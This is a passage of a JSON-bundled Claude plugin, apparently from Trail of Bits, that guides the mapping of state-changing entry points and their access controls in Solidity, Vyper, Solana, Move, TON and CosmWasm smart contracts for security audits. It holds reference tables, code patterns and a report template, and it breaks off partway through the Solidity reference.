        "plugins/entry-point-analyzer/.claude-plugin/plugin.json": "{\n  \"name\": \"entry-point-analyzer\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Analyzes smart contract codebases to identify state-changing entry points for security auditing. Detects externally callable functions that modify state, categorizes them by access level, and generates structured audit reports.\",\n  \"author\": {\n    \"name\": \"Nicolas Donboly\",\n    \"email\": \"opensource@trailofbits.com\",\n    \"url\": \"https://github.com/trailofbits\"\n  }\n}\n",
        "plugins/entry-point-analyzer/README.md": "# Entry Point Analyzer\n\nA Claude skill for systematically identifying **state-changing** entry points in smart contract codebases to guide security audits.\n\n## Purpose\n\nWhen auditing smart contracts, examining each file or function individually is inefficient. What auditors need is to start from **entry points**the externally callable functions that represent the attack surface. This skill automates the identification and classification of state-changing entry points, excluding view/pure/read-only functions that cannot directly cause loss of funds or state corruption.\n\n## Supported Languages\n\n| Language | File Extensions | Framework Support |\n|----------|-----------------|-------------------|\n| Solidity | `.sol` | OpenZeppelin, custom modifiers |\n| Vyper | `.vy` | Native patterns |\n| Solana | `.rs` | Anchor, Native |\n| Move | `.move` | Aptos, Sui |\n| TON | `.fc`, `.func`, `.tact` | FunC, Tact |\n| CosmWasm | `.rs` | cw-ownable, cw-controllers |\n\n## Access Classifications\n\nThe skill categorizes entry points into four levels:\n\n1. **Public (Unrestricted)**  Callable by anyone; highest audit priority\n2. **Role-Restricted**  Limited to specific roles (admin, governance, guardian, etc.)\n3. **Review Required**  Ambiguous access patterns needing manual verification\n4. **Contract-Only**  Internal integration points (callbacks, hooks)\n\n## Output\n\nGenerates a structured markdown report with:\n- Summary table of entry point counts by category\n- Detailed tables for each access level\n- Function signatures with file:line references\n- Restriction patterns and role assignments\n- List of analyzed files\n\n## Usage\n\nTrigger the skill with requests like:\n- \"Analyze the entry points in this codebase\"\n- \"Find all external functions and access levels\"\n- \"List audit flows for src/core/\"\n- \"What privileged operations exist in this project?\"\n\n## Directory Filtering\n\nSpecify a subdirectory to limit scope:\n- \"Analyze only `src/core/`\"\n- \"Find entry points in `contracts/protocol/`\"\n\n## Role Detection\n\nThe skill infers roles from common patterns:\n\n| Pattern | Detected Role |\n|---------|---------------|\n| `onlyOwner`, `msg.sender == owner` | Owner |\n| `onlyAdmin`, `ADMIN_ROLE` | Admin |\n| `onlyGovernance`, `governance` | Governance |\n| `onlyGuardian`, `onlyPauser` | Guardian |\n| `onlyKeeper`, `onlyRelayer` | Keeper/Relayer |\n| `onlyStrategy`, `strategist` | Strategist |\n| Dynamic checks (`authorized[msg.sender]`) | Review Required |\n\n## Installation\n\n```\n/plugin install trailofbits/skills/plugins/entry-point-analyzer\n```\n\n## License\n\nSee LICENSE.txt for terms.\n",
        "plugins/entry-point-analyzer/commands/entry-points.md": "---\nname: trailofbits:entry-points\ndescription: Identifies state-changing entry points in smart contracts\nargument-hint: \"[directory-path]\"\nallowed-tools:\n  - Read\n  - Grep\n  - Glob\n  - Bash\n---\n\n# Analyze Smart Contract Entry Points\n\n**Arguments:** $ARGUMENTS\n\nParse the directory path from arguments. If empty, use current directory.\n\nInvoke the `entry-point-analyzer` skill with the directory path for the full workflow.\n",
        "plugins/entry-point-analyzer/skills/entry-point-analyzer/SKILL.md": "---\nname: entry-point-analyzer\ndescription: Analyzes smart contract codebases to identify state-changing entry points for security auditing. Detects externally callable functions that modify state, categorizes them by access level (public, admin, role-restricted, contract-only), and generates structured audit reports. Excludes view/pure/read-only functions. Use when auditing smart contracts (Solidity, Vyper, Solana/Rust, Move, TON, CosmWasm) or when asked to find entry points, audit flows, external functions, access control patterns, or privileged operations.\nallowed-tools:\n  - Read\n  - Grep\n  - Glob\n  - Bash\n---\n\n# Entry Point Analyzer\n\nSystematically identify all **state-changing** entry points in a smart contract codebase to guide security audits.\n\n## When to Use\n\nUse this skill when:\n- Starting a smart contract security audit to map the attack surface\n- Asked to find entry points, external functions, or audit flows\n- Analyzing access control patterns across a codebase\n- Identifying privileged operations and role-restricted functions\n- Building an understanding of which functions can modify contract state\n\n## When NOT to Use\n\nDo NOT use this skill for:\n- Vulnerability detection (use audit-context-building or domain-specific-audits)\n- Writing exploit POCs (use solidity-poc-builder)\n- Code quality or gas optimization analysis\n- Non-smart-contract codebases\n- Analyzing read-only functions (this skill excludes them)\n\n## Scope: State-Changing Functions Only\n\nThis skill focuses exclusively on functions that can modify state. **Excluded:**\n\n| Language | Excluded Patterns |\n|----------|-------------------|\n| Solidity | `view`, `pure` functions |\n| Vyper | `@view`, `@pure` functions |\n| Solana | Functions without `mut` account references |\n| Move | Non-entry `public fun` (module-callable only) |\n| TON | `get` methods (FunC), read-only receivers (Tact) |\n| CosmWasm | `query` entry point and its handlers |\n\n**Why exclude read-only functions?** They cannot directly cause loss of funds or state corruption. While they may leak information, the primary audit focus is on functions that can change state.\n\n## Workflow\n\n1. **Detect Language** - Identify contract language(s) from file extensions and syntax\n2. **Use Tooling (if available)** - For Solidity, check if Slither is available and use it\n3. **Locate Contracts** - Find all contract/module files (apply directory filter if specified)\n4. **Extract Entry Points** - Parse each file for externally callable, state-changing functions\n5. **Classify Access** - Categorize each function by access level\n6. **Generate Report** - Output structured markdown report\n\n## Slither Integration (Solidity)\n\nFor Solidity codebases, Slither can automatically extract entry points. Before manual analysis:\n\n### 1. Check if Slither is Available\n\n```bash\nwhich slither\n```\n\n### 2. If Slither is Detected, Run Entry Points Printer\n\n```bash\nslither . --print entry-points\n```\n\nThis outputs a table of all state-changing entry points with:\n- Contract name\n- Function name\n- Visibility\n- Modifiers applied\n\n### 3. Use Slither Output as Foundation\n\n- Parse the Slither output table to populate your analysis\n- Cross-reference with manual inspection for access control classification\n- Slither may miss some patterns (callbacks, dynamic access control)supplement with manual review\n- If Slither fails (compilation errors, unsupported features), fall back to manual analysis\n\n### 4. When Slither is NOT Available\n\nIf `which slither` returns nothing, proceed with manual analysis using the language-specific reference files.\n\n## Language Detection\n\n| Extension | Language | Reference |\n|-----------|----------|-----------|\n| `.sol` | Solidity | [{baseDir}/references/solidity.md]({baseDir}/references/solidity.md) |\n| `.vy` | Vyper | [{baseDir}/references/vyper.md]({baseDir}/references/vyper.md) |\n| `.rs` + `Cargo.toml` with `solana-program` | Solana (Rust) | [{baseDir}/references/solana.md]({baseDir}/references/solana.md) |\n| `.move` + `Move.toml` with `edition` | [{baseDir}/references/move-sui.md]({baseDir}/references/move-sui.md) |\n| `.move` + `Move.toml` with `Aptos` | [{baseDir}/references/move-aptos.md]({baseDir}/references/move-aptos.md) |\n| `.fc`, `.func`, `.tact` | TON (FunC/Tact) | [{baseDir}/references/ton.md]({baseDir}/references/ton.md) |\n| `.rs` + `Cargo.toml` with `cosmwasm-std` | CosmWasm | [{baseDir}/references/cosmwasm.md]({baseDir}/references/cosmwasm.md) |\n\nLoad the appropriate reference file(s) based on detected language before analysis.\n\n## Access Classification\n\nClassify each state-changing entry point into one of these categories:\n\n### 1. Public (Unrestricted)\nFunctions callable by anyone without restrictions.\n\n### 2. Role-Restricted\nFunctions limited to specific roles. Common patterns to detect:\n- Explicit role names: `admin`, `owner`, `governance`, `guardian`, `operator`, `manager`, `minter`, `pauser`, `keeper`, `relayer`, `lender`, `borrower`\n- Role-checking patterns: `onlyRole`, `hasRole`, `require(msg.sender == X)`, `assert_owner`, `#[access_control]`\n- When role is ambiguous, flag as **\"Restricted (review required)\"** with the restriction pattern noted\n\n### 3. Contract-Only (Internal Integration Points)\nFunctions callable only by other contracts, not by EOAs. Indicators:\n- Callbacks: `onERC721Received`, `uniswapV3SwapCallback`, `flashLoanCallback`\n- Interface implementations with contract-caller checks\n- Functions that revert if `tx.origin == msg.sender`\n- Cross-contract hooks\n\n## Output Format\n\nGenerate a markdown report with this structure:\n\n```markdown\n# Entry Point Analysis: [Project Name]\n\n**Analyzed**: [timestamp]\n**Scope**: [directories analyzed or \"full codebase\"]\n**Languages**: [detected languages]\n**Focus**: State-changing functions only (view/pure excluded)\n\n## Summary\n\n| Category | Count |\n|----------|-------|\n| Public (Unrestricted) | X |\n| Role-Restricted | X |\n| Restricted (Review Required) | X |\n| Contract-Only | X |\n| **Total** | **X** |\n\n---\n\n## Public Entry Points (Unrestricted)\n\nState-changing functions callable by anyoneprioritize for attack surface analysis.\n\n| Function | File | Notes |\n|----------|------|-------|\n| `functionName(params)` | `path/to/file.sol:L42` | Brief note if relevant |\n\n---\n\n## Role-Restricted Entry Points\n\n### Admin / Owner\n| Function | File | Restriction |\n|----------|------|-------------|\n| `setFee(uint256)` | `Config.sol:L15` | `onlyOwner` |\n\n### Governance\n| Function | File | Restriction |\n|----------|------|-------------|\n\n### Guardian / Pauser\n| Function | File | Restriction |\n|----------|------|-------------|\n\n### Other Roles\n| Function | File | Restriction | Role |\n|----------|------|-------------|------|\n\n---\n\n## Restricted (Review Required)\n\nFunctions with access control patterns that need manual verification.\n\n| Function | File | Pattern | Why Review |\n|----------|------|---------|------------|\n| `execute(bytes)` | `Executor.sol:L88` | `require(trusted[msg.sender])` | Dynamic trust list |\n\n---\n\n## Contract-Only (Internal Integration Points)\n\nFunctions only callable by other contractsuseful for understanding trust boundaries.\n\n| Function | File | Expected Caller |\n|----------|------|-----------------|\n| `onFlashLoan(...)` | `Vault.sol:L200` | Flash loan provider |\n\n---\n\n## Files Analyzed\n\n- `path/to/file1.sol` (X state-changing entry points)\n- `path/to/file2.sol` (X state-changing entry points)\n```\n\n## Filtering\n\nWhen user specifies a directory filter:\n- Only analyze files within that path\n- Note the filter in the report header\n- Example: \"Analyze only `src/core/`\"  scope = `src/core/`\n\n## Analysis Guidelines\n\n1. **Be thorough**: Don't skip files. Every state-changing externally callable function matters.\n2. **Be conservative**: When uncertain about access level, flag for review rather than miscategorize.\n3. **Skip read-only**: Exclude `view`, `pure`, and equivalent read-only functions.\n4. **Note inheritance**: If a function's access control comes from a parent contract, note this.\n5. **Track modifiers**: List all access-related modifiers/decorators applied to each function.\n6. **Identify patterns**: Look for common patterns like:\n   - Initializer functions (often unrestricted on first call)\n   - Upgrade functions (high-privilege)\n   - Emergency/pause functions (guardian-level)\n   - Fee/parameter setters (admin-level)\n   - Token transfers and approvals (often public)\n\n## Common Role Patterns by Protocol Type\n\n| Protocol Type | Common Roles |\n|---------------|--------------|\n| DEX | `owner`, `feeManager`, `pairCreator` |\n| Lending | `admin`, `guardian`, `liquidator`, `oracle` |\n| Governance | `proposer`, `executor`, `canceller`, `timelock` |\n| NFT | `minter`, `admin`, `royaltyReceiver` |\n| Bridge | `relayer`, `guardian`, `validator`, `operator` |\n| Vault/Yield | `strategist`, `keeper`, `harvester`, `manager` |\n\n## Rationalizations to Reject\n\nWhen analyzing entry points, reject these shortcuts:\n- \"This function looks standard\"  Still classify it; standard functions can have non-standard access control\n- \"The modifier name is clear\"  Verify the modifier's actual implementation\n- \"This is obviously admin-only\"  Trace the actual restriction; \"obvious\" assumptions miss subtle bypasses\n- \"I'll skip the callbacks\"  Callbacks define trust boundaries; always include them\n- \"It doesn't modify much state\"  Any state change can be exploited; include all non-view functions\n\n## Error Handling\n\nIf a file cannot be parsed:\n1. Note it in the report under \"Analysis Warnings\"\n2. Continue with remaining files\n3. Suggest manual review for unparsable files\n",
        "plugins/entry-point-analyzer/skills/entry-point-analyzer/references/cosmwasm.md": "# CosmWasm Entry Point Detection\n\n## Entry Point Identification (State-Changing Only)\n\n### Include: State-Changing Entry Points\n```rust\n// Instantiate - called once on deployment\n#[cfg_attr(not(feature = \"library\"), entry_point)]\npub fn instantiate(\n    deps: DepsMut,\n    env: Env,\n    info: MessageInfo,\n    msg: InstantiateMsg,\n) -> Result<Response, ContractError> { }\n\n// Execute - main entry point for state changes\n#[cfg_attr(not(feature = \"library\"), entry_point)]\npub fn execute(\n    deps: DepsMut,\n    env: Env,\n    info: MessageInfo,\n    msg: ExecuteMsg,\n) -> Result<Response, ContractError> { }\n\n// Query - read-only entry point\n#[cfg_attr(not(feature = \"library\"), entry_point)]\npub fn query(\n    deps: Deps,\n    env: Env,\n    msg: QueryMsg,\n) -> StdResult<Binary> { }\n\n// Migrate - called on contract migration\n#[cfg_attr(not(feature = \"library\"), entry_point)]\npub fn migrate(\n    deps: DepsMut,\n    env: Env,\n    msg: MigrateMsg,\n) -> Result<Response, ContractError> { }\n\n// Reply - handles submessage responses\n#[cfg_attr(not(feature = \"library\"), entry_point)]\npub fn reply(\n    deps: DepsMut,\n    env: Env,\n    msg: Reply,\n) -> Result<Response, ContractError> { }\n\n// Sudo - privileged operations (governance)\n#[cfg_attr(not(feature = \"library\"), entry_point)]\npub fn sudo(\n    deps: DepsMut,\n    env: Env,\n    msg: SudoMsg,\n) -> Result<Response, ContractError> { }\n```\n\n### Entry Point Types\n| Entry Point | Include? | Classification | Notes |\n|-------------|----------|----------------|-------|\n| `instantiate` | **Yes** | One-time setup | Sets initial state |\n| `execute` | **Yes** | Main dispatcher | Contains multiple operations |\n| `query` | No | Read-only | EXCLUDE - no state changes |\n| `migrate` | **Yes** | Admin/Governance | Requires migration permission |\n| `reply` | **Yes** | Contract-Only | Submessage callback |\n| `sudo` | **Yes** | Governance | Chain-level privileged |\n\n### ExecuteMsg Variants (Primary Focus)\n```rust\n#[cw_serde]\npub enum ExecuteMsg {\n    Transfer { recipient: String, amount: Uint128 },     // Usually public\n    UpdateConfig { admin: Option<String> },              // Admin only\n    Pause {},                                            // Guardian\n    Withdraw { amount: Uint128 },                        // Public or restricted\n}\n```\n\n## Access Control Patterns\n\n### Cw-Ownable Pattern\n```rust\nuse cw_ownable::{assert_owner, initialize_owner};\n\npub fn execute_admin_action(deps: DepsMut, info: MessageInfo) -> Result<...> {\n    assert_owner(deps.storage, &info.sender)?;\n    // ...\n}\n```\n\n### Manual Owner Check\n```rust\npub fn execute_update_config(deps: DepsMut, info: MessageInfo) -> Result<...> {\n    let config = CONFIG.load(deps.storage)?;\n    if info.sender != config.owner {\n        return Err(ContractError::Unauthorized {});\n    }\n    // ...\n}\n```\n\n### Role-Based Access\n```rust\n// Common patterns\nif info.sender != state.admin { return Err(Unauthorized); }\nif info.sender != state.governance { return Err(Unauthorized); }\nif !state.operators.contains(&info.sender) { return Err(Unauthorized); }\n\n// Using cw-controllers\nuse cw_controllers::Admin;\nADMIN.assert_admin(deps.as_ref(), &info.sender)?;\n```\n\n### Access Control Classification\n| Pattern | Classification |\n|---------|----------------|\n| `assert_owner(storage, &sender)` | Owner |\n| `ADMIN.assert_admin(deps, &sender)` | Admin |\n| `info.sender != config.owner` | Owner |\n| `info.sender != config.admin` | Admin |\n| `info.sender != config.governance` | Governance |\n| `!operators.contains(&sender)` | Operator |\n| `!guardians.contains(&sender)` | Guardian |\n| No sender check | Public (Unrestricted) |\n\n## Contract-Only Detection\n\n### Reply Handler\n```rust\n#[entry_point]\npub fn reply(deps: DepsMut, env: Env, msg: Reply) -> Result<Response, ContractError> {\n    match msg.id {\n        INSTANTIATE_REPLY_ID => handle_instantiate_reply(deps, msg),\n        _ => Err(ContractError::UnknownReplyId { id: msg.id }),\n    }\n}\n```\n\n### Callback Messages\n```rust\n// Messages expected from other contracts\nExecuteMsg::Callback { ... } => {\n    // Should verify sender is expected contract\n    if info.sender != expected_contract {\n        return Err(ContractError::Unauthorized {});\n    }\n}\n```\n\n## Extraction Strategy\n\n1. **Find Message Enums**:\n   - `ExecuteMsg` - main operations (INCLUDE)\n   - `QueryMsg` - read operations (EXCLUDE)\n   - `SudoMsg` - governance operations (INCLUDE)\n\n2. **For Each ExecuteMsg Variant**:\n   - Find handler function (usually `execute_<variant_name>`)\n   - Check for access control at start of function\n   - Classify by access pattern\n\n3. **Map Entry Points**:\n   - `execute` dispatcher  enumerate variants (state-changing)\n   - `query`  **SKIP** (read-only, no state changes)\n   - `sudo`  all variants are governance-level\n   - `reply`  contract-only callbacks\n\n## CosmWasm-Specific Considerations\n\n1. **Message Info**: `info.sender` is the caller address\n2. **Query Has No Sender**: Queries are stateless, no access control\n3. **Sudo Is Privileged**: Only callable by chain governance\n4. **Submessages**: `reply` handles responses from submessages\n5. **IBC**: IBC entry points for cross-chain messages\n\n## Common Gotchas\n\n1. **Instantiate Race**: First caller sets owner if not careful\n2. **Migration Admin**: Separate from contract admin\n3. **Cw20 Callbacks**: `Cw20ReceiveMsg` is a callback pattern\n4. **IBC Callbacks**: `ibc_packet_receive` etc. are entry points\n5. **Admin vs Owner**: May be different addresses\n",
        "plugins/entry-point-analyzer/skills/entry-point-analyzer/references/move-aptos.md": "# Move Entry Point Detection (Aptos)\n\n## Entry Point Identification (State-Changing Only)\n\nIn Move, `public` functions can be invoked from transaction scripts (Aptos) and typically modify state. In addition, all `entry` functions are entrypoints. Package-protected (`public package`) and friend (`friend` or `public friend`) functions should be excluded.\n\n### Aptos Move\n```move\n// Public entry functions are entry points\npublic entry fun transfer(from: &signer, to: address, amount: u64) { }\n\n// Public functions callable by other modules\npublic fun helper(): u64 { }\n\n// Entry-only functions (can't be called by other modules)\nentry fun private_entry(account: &signer) { }\n```\n\n### Visibility Rules\n| Visibility | Include? | Notes |\n|------------|----------|-------|\n| `public entry fun` | **Yes** | Transaction entry point (state-changing) |\n| `entry fun` | **Yes** | Transaction-only entry point |\n| `public fun` | No | Module-callable only, not direct entry |\n| `fun` (private) | No | Not externally callable |\n| `public(friend) fun` | No | Friend modules only |\n\n## Access Control Patterns\n\n### Signer-Based Control (Aptos)\n```move\n// Admin check via signer\npublic entry fun admin_action(admin: &signer) {\n    assert!(signer::address_of(admin) == @admin_address, E_NOT_ADMIN);\n}\n\n// Owner check via resource\npublic entry fun owner_action(owner: &signer) acquires Config {\n    let config = borrow_global<Config>(@module_addr);\n    assert!(signer::address_of(owner) == config.owner, E_NOT_OWNER);\n}\n```\n\n### Capability Pattern (Aptos)\n```move\n// Capability resource\nstruct AdminCap has key, store {}\n\n// Requires capability\npublic entry fun admin_action(admin: &signer) acquires AdminCap {\n    assert!(exists<AdminCap>(signer::address_of(admin)), E_NO_CAP);\n}\n```\n\n### Access Control Classification\n| Pattern | Classification |\n|---------|----------------|\n| `signer::address_of(s) == @admin` | Admin |\n| `signer::address_of(s) == config.owner` | Owner |\n| `exists<AdminCap>(addr)` | Admin (capability) |\n| `exists<GovernanceCap>(addr)` | Governance |\n| `exists<GuardianCap>(addr)` | Guardian |\n| `&signer` with no checks | Review Required |\n\n## Contract-Only Detection\n\n### Friend Functions\n```move\n// Only callable by friend modules\npublic(friend) fun internal_callback() { }\n\n// Friend declaration\nfriend other_module;\n```\n\n### Module-to-Module Patterns\n```move\n// Functions designed for other modules\npublic fun on_transfer_hook(amount: u64): bool {\n    // Called by token module\n}\n```\n\n## Extraction Strategy\n\n### Aptos\n1. Parse all `.move` files\n2. Find `module` declarations\n3. Extract functions with `public entry` or `entry` visibility\n4. Check function body for:\n   - `signer::address_of` comparisons  Role-based\n   - `exists<*Cap>` checks  Capability-based\n   - No access checks  Public (Unrestricted)\n\n## Move-Specific Considerations\n\n1. **Resource Model**: Access control often through resource ownership\n2. **Capabilities**: `Cap` suffix typically indicates capability pattern\n3. **Acquires**: `acquires Resource` shows what global resources are accessed\n4. **Generic Types**: Type parameters may carry capability constraints\n5. **Friend Visibility**: `public(friend)` limits callers to declared friends\n\n## Common Gotchas\n\n1. **Init Functions**: `init` or `initialize` often create initial capabilities\n2. **Module Upgrades**: Check upgrade capability ownership\n3. **Phantom Types**: Type parameters with `phantom` don't affect runtime\n",
        "plugins/entry-point-analyzer/skills/entry-point-analyzer/references/move-sui.md": "# Move Entry Point Detection (Sui)\n\n## Entry Point Identification (State-Changing Only)\n\nIn Move, `public` functions can be invoked from programmable transaction blocks (Sui) or transaction scripts (Aptos) and typically modify state. In addition, private `entry` functions are entrypoints. Package-protected (`public(package) fun`) and private (`fun`) functions should be excluded.\n\n```move\n// Public functions\npublic fun compute(obj: &mut Object): u64 { }\n\n// Entry functions in Sui\npublic entry fun transfer(ctx: &mut TxContext) { }\n```\n\n### Visibility Rules\n| Visibility | Include? | Notes |\n|------------|----------|-------|\n| `public entry fun` | **Yes** | Callable from transactions and modules |\n| `public fun` | **Yes** | Callable from transactions and modules |\n| `entry fun` | **Yes** | Callable from transactions, but not other modules |\n| `fun` (private) | No | Not externally callable |\n| `public(package) fun` | No | Only callable by other modules in the same package |\n\n## Access Control Patterns\n\n```move\n// Object types have the key ability\npublic struct MyObject has key { id: ID, ... }\n\n// Capability objects typically have names that end with \"Cap\"\npublic struct AdminCap has key { id: ID, ... }\n\n// Shared objects are created via `public_share\npublic struct Pool has key { id: ID, ... }\n\n// Object ownership provides access control\npublic fun use_owned_object(obj: &mut MyObject) {\n    // Only owner of obj can call this\n}\n\n// Shared object - anyone can access\npublic fun use_shared(pool: &mut Pool) { }\n\n// Shared Pool object gated by capability - only owner of AdminCap can call\npublic fun capability_gate(_cap: &AdminCap, pool: &mut Pool) {}\n```\n\n### Access Control Classification\n| Pattern | Classification |\n|---------|----------------|\n| Owned object parameter | Owner of object |\n| Shared object | Public (Unrestricted) |\n\n## Contract-Only Detection\n\n### Package-protected Functions\n```move\n// Only callable by other modules in the same Move package\npublic(protected) fun internal_fun() { }\n```\n\n## Extraction Strategy\n\n1. Parse all `.move` files\n2. Find `module` declarations\n3. Extract `public`, `public entry`, and `entry` functions\n4. Extract object type declarations (`struct`'s that have the `key` ability)\n5. Determine whether each object type is **owned** (passed as parameter to `transfer` or `public_transfer` functions) or **shared** (passed as parameter to `share` or `public_share` functions)\n6. Analyze parameters:\n   - Owned object type with \"XCap\" in name -> X role (e.g., AdminCap = Admin role, GuardianCap = Guardian role)\n   - Owned object type without \"Cap\" in name -> Owner role\n   - Shared object type -> Public\n\n## Move-Specific Considerations\n\n1. **Object Model**: Access control typically through object ownership (rather than runtime assertions)\n2. **Capabilities**: `Cap` suffix typically indicates capability pattern\n4. **Generic Types**: Type parameters may carry capability constraints\n5. **Package Visibility**: `public(pacakge)` limits callers to modules in the same package\n\n## Common Gotchas\n\n1. **Module Initializers**: `init` functions often create singletone shared objects and initial capabilities\n2. **Object Wrapping**: Wrapped objects transfer ownership\n3. **Shared vs Owned**: Shared objects can be accessed by anyone, owned objects only by a transaction sent by the owner\n4. **Package Upgrades**: Upgrades can introduce new types and functions and change old ones in type-compatible ways\n5. **Phantom Types**: Type parameters with `phantom` don't affect runtime\n",
        "plugins/entry-point-analyzer/skills/entry-point-analyzer/references/solana.md": "# Solana Entry Point Detection\n\n## Entry Point Identification (State-Changing Only)\n\nIn Solana, most program instructions modify state. **Exclude** view-only patterns:\n- Instructions that only read account data without `mut` references\n- Pure computation functions that don't write to accounts\n\n### Native Solana Programs\n```rust\n// Single entrypoint macro\nentrypoint!(process_instruction);\n\npub fn process_instruction(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n    instruction_data: &[u8],\n) -> ProgramResult {\n    // Dispatch to handlers based on instruction_data\n}\n```\n\n### Anchor Framework\n```rust\n#[program]\nmod my_program {\n    use super::*;\n    \n    // Each pub fn is an entry point\n    pub fn initialize(ctx: Context<Initialize>) -> Result<()> { }\n    pub fn transfer(ctx: Context<Transfer>, amount: u64) -> Result<()> { }\n}\n```\n\n### Entry Point Detection Rules\n| Pattern | Include? | Notes |\n|---------|----------|-------|\n| `entrypoint!(fn_name)` | **Yes** | Native program entry |\n| `pub fn` inside `#[program]` mod with `mut` accounts | **Yes** | Anchor state-changing |\n| `pub fn` inside `#[program]` mod (view-only) | No | Exclude if no `mut` accounts |\n| Functions in `processor.rs` matching instruction enum | **Yes** | Native pattern |\n| Internal helper functions | No | Not externally callable |\n\n## Access Control Patterns\n\n### Anchor Constraints\n```rust\n#[derive(Accounts)]\npub struct AdminOnly<'info> {\n    #[account(mut)]\n    pub admin: Signer<'info>,\n    \n    #[account(\n        constraint = config.admin == admin.key() @ ErrorCode::Unauthorized\n    )]\n    pub config: Account<'info, Config>,\n}\n```\n\n### Common Access Control Patterns\n| Pattern | Classification |\n|---------|----------------|\n| `constraint = X.admin == signer.key()` | Admin |\n| `constraint = X.owner == signer.key()` | Owner |\n| `constraint = X.authority == signer.key()` | Authority (Admin-level) |\n| `constraint = X.governance == signer.key()` | Governance |\n| `constraint = X.guardian == signer.key()` | Guardian |\n| `has_one = admin` | Admin |\n| `has_one = owner` | Owner |\n| `has_one = authority` | Authority |\n| `Signer` account with no constraints | Review Required |\n\n### Native Access Control\n```rust\n// Check signer\nif !accounts[0].is_signer {\n    return Err(ProgramError::MissingRequiredSignature);\n}\n\n// Check specific authority\nif accounts[0].key != &expected_authority {\n    return Err(ProgramError::InvalidAccountData);\n}\n```\n\n### Access Control Macros (Anchor)\n```rust\n#[access_control(is_admin(&ctx))]\npub fn admin_function(ctx: Context<AdminAction>) -> Result<()> { }\n\nfn is_admin(ctx: &Context<AdminAction>) -> Result<()> {\n    require!(ctx.accounts.admin.key() == ADMIN_PUBKEY, Unauthorized);\n    Ok(())\n}\n```\n\n## Contract-Only Detection (CPI Patterns)\n\n### Cross-Program Invocation Sources\n```rust\n// Functions expected to be called via CPI\npub fn on_token_transfer(ctx: Context<TokenCallback>, amount: u64) -> Result<()> {\n    // Should verify calling program\n    require!(\n        ctx.accounts.calling_program.key() == expected_program::ID,\n        ErrorCode::InvalidCaller\n    );\n}\n```\n\n### CPI Verification Patterns\n```rust\n// Verify CPI caller\nlet calling_program = ctx.accounts.calling_program.key();\nrequire!(calling_program == &spl_token::ID, InvalidCaller);\n\n// Check instruction sysvar for CPI\nlet ix = load_current_index_checked(&ctx.accounts.instruction_sysvar)?;\n```\n\n## Extraction Strategy\n\n1. **Detect Framework**:\n   - Check `Cargo.toml` for `anchor-lang`  Anchor\n   - Check for `entrypoint!` macro  Native\n   \n2. **For Anchor**:\n   - Find `#[program]` module\n   - Extract all `pub fn` within it\n   - Parse `#[derive(Accounts)]` structs for constraints\n   \n3. **For Native**:\n   - Find instruction enum (usually in `instruction.rs`)\n   - Map variants to handler functions in `processor.rs`\n   - Check each handler for signer/authority checks\n\n4. **Classify**:\n   - No authority constraints  Public (Unrestricted)\n   - `has_one`, `constraint` with authority  Role-based\n   - CPI-only patterns  Contract-Only\n\n## Solana-Specific Considerations\n\n1. **Account Validation**: Access control often via account constraints, not function-level\n2. **PDA Authority**: Program Derived Addresses can act as authorities\n3. **Signer vs Authority**: `Signer` alone doesn't mean admincheck what the signer controls\n4. **Instruction Data**: Native programs dispatch based on instruction discriminator\n\n## Common Gotchas\n\n1. **Initialize Patterns**: `is_initialized` checksfirst caller may set authority\n2. **Upgrade Authority**: Programs can be upgradedcheck upgrade authority\n3. **Multisig**: Some operations require multiple signers\n4. **CPI Safety**: Functions callable via CPI should verify calling program\n5. **Freeze Authority**: Token accounts may have freeze authority\n",
        "plugins/entry-point-analyzer/skills/entry-point-analyzer/references/solidity.md": "# Solidity Entry Point Detection\n\n## Entry Point Identification (State-Changing Only)\n\n### Include: State-Changing Functions\n```solidity\nfunction name() external { }           // State-changing entry point\nfunction name() external payable { }   // State-changing, receives ETH\nfunction name() public { }             // State-changing entry point\n```\n\n### Exclude: Read-Only Functions\n```solidity\nfunction name() external view { }      // EXCLUDE - cannot modify state\nfunction name() external pure { }      // EXCLUDE - no state access\nfunction name() public view { }        // EXCLUDE - cannot modify state\n```\n\n### Visibility and Mutability Matrix\n| Visibility | Mutability | Include? | Notes |\n|------------|------------|----------|-------|\n| `external` | (none) | **Yes** | State-changing entry point |\n| `external` | `payable` | **Yes** | State-changing, receives ETH |\n| `external` | `view` | No | Read-only, exclude |\n| `external` | `pure` | No | No state access, exclude |\n| `public` | (none) | **Yes** | State-changing entry point |\n| `public` | `payable` | **Yes** | State-changing, receives ETH |\n| `public` | `view` | No | Read-only, exclude |\n| `public` | `pure` | No | No state access, exclude |\n| `internal` | any | No | Not externally callable |\n| `private` | any | No | Not externally callable |\n\n### Special Entry Points\n- `receive() external payable`  Receives plain ETH transfers\n- `fallback() external`  Catches unmatched function calls\n- `constructor()`  One-time initialization (not recurring entry point)\n\n## Access Control Patterns\n\n### OpenZeppelin Patterns\n```solidity\n// Ownable\nmodifier onlyOwner() { require(msg.sender == owner); }\n\n// AccessControl\nmodifier onlyRole(bytes32 role) { require(hasRole(role, msg.sender)); }\n\n// Common role constants\nbytes32 public constant ADMIN_ROLE = keccak256(\"ADMIN_ROLE\");\nbytes32 public constant MINTER_ROLE = keccak256(\"MINTER_ROLE\");\nbytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\");\n```\n\n### Common Modifier Names  Role Classification\n| Modifier Pattern | Classification |\n|------------------|----------------|\n| `onlyOwner` | Admin/Owner |\n| `onlyAdmin` | Admin |\n| `onlyRole(ADMIN_ROLE)` | Admin |\n| `onlyRole(GOVERNANCE_ROLE)` | Governance |\n| `onlyGovernance` | Governance |\n| `onlyGuardian` | Guardian |\n| `onlyPauser`, `whenNotPaused` | Guardian/Pauser |\n| `onlyMinter` | Minter |\n| `onlyOperator` | Operator |\n| `onlyKeeper` | Keeper |\n| `onlyRelayer` | Relayer |\n| `onlyStrategy`, `onlyStrategist` | Strategist |\n| `onlyVault` | Contract-Only |\n\n### Inline Access Control (Flag for Review)\n```solidity\nrequire(msg.sender == someAddress, \"...\");      // Check who someAddress is\nrequire(authorized[msg.sender], \"...\");         // Dynamic authorization\nrequire(whitelist[msg.sender], \"...\");          // Whitelist pattern\nif (msg.sender != admin) revert();              // Inline admin check\n```\n\n## Contract-Only Detection\n\n### Callback Functions\n```solidity\n// ERC token callbacks\nfunction onERC721Received(...) external returns (bytes4)\nfunction onERC1155Received(...) external returns (bytes4)\nfunction onERC1155BatchReceived(...) external returns (bytes4)\n\n// DeFi callbacks\nfunction uniswapV3SwapCallback(...) external\nfunction uniswapV3MintCallback(...) external\nfunction pancakeV3SwapCallback(...) external\nfunction 